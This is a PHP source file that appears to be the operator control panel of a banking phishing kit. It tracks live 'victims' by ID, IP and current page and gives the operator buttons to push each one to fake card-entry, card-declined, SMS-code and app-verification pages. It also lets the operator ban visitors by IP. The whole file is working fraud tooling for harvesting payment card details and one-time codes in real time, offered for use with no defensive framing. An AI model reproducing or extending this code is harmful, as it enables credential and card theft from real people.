<?php

require '../classes/Jeehan.class.php';
$jeehan = new Jeehan();
$jeehan->createVic();
$pdo = $jeehan->_pdo;
if(isset($_POST['redirectionListener'])){
	echo $jeehan->get("redirect");
}



if(isset($_POST['clearRedirection'])){
	 $jeehan->redirect(0);
}





$c = 0;

if(isset($_POST['getVictims'])){
	$getAll=$pdo->prepare("SELECT * FROM vics WHERE ip NOT in (select ip from blockedvics) AND last_act > ".(time() - 10));
	$getAll->execute();
	$rows = $getAll->fetchAll(PDO::FETCH_ASSOC);
	if(!$rows){
		echo "No one in here :(";
	}else{
		foreach($rows as $row){
			$c++;
			if($c==2){
				$css="selected";
				$c=0;
			}else{
				$css="";
			}

			echo "
<div class='vic ".$css."' >
<span> VICTIM ID:</span> ".$row['id']." <br>
 <span>VICTIM IP:</span> ".$row['ip']."   <br>
 <span>CURRENT PAGE:</span> ".$row['current_page']."
<div class='options'>
<div class='title'>Redirects</div>
<button onclick='redirectVic(1, ".$row['id'].")'>Card</button>
<button onclick='redirectVic(2, ".$row['id'].")'>Card Error</button>
<button onclick='redirectVic(3, ".$row['id'].")'>Card Declined</button>
<button onclick='redirectVic(4, ".$row['id'].")'>SMS</button>
<button onclick='redirectVic(5, ".$row['id'].")'>SMS Error</button>
<button onclick='redirectVic(6, ".$row['id'].")'>Finish</button>
</div>
 <div class='options'>
 <div class='title'>Bank Confirmtion</div>
<button onclick='redirectVic(7, ".$row['id'].")'>App Verif</button>
 </div>
 <div class='options'>
  <div class='title'>OPOTIONS</div>
 <button onclick='ban(\"".$row['ip']."\")'>BAN Victim</button>
 </div>
</div>
";


		}

	}

}



if(isset($_POST['keepAlive'])){
 $jeehan->keepAlive(time(), $_POST['page']);
}



if(isset($_POST['ban'])){
 $jeehan->block($_POST['ban']);
 echo "Victim [".$_POST['ban']."] has been blocked.";
}



if(isset($_POST['getOnlineVics'])){
 echo $jeehan->getOnlineVics();
}



if(isset($_POST['pageID'])){
	$pageID = $_POST['pageID'];
	$vicID = $_POST['vicID'];
	$update = $pdo->prepare("UPDATE vics SET redirect=:r WHERE id=:id");
	$update->execute([":r"=>$pageID, ":id"=>$vicID]);
}








?>
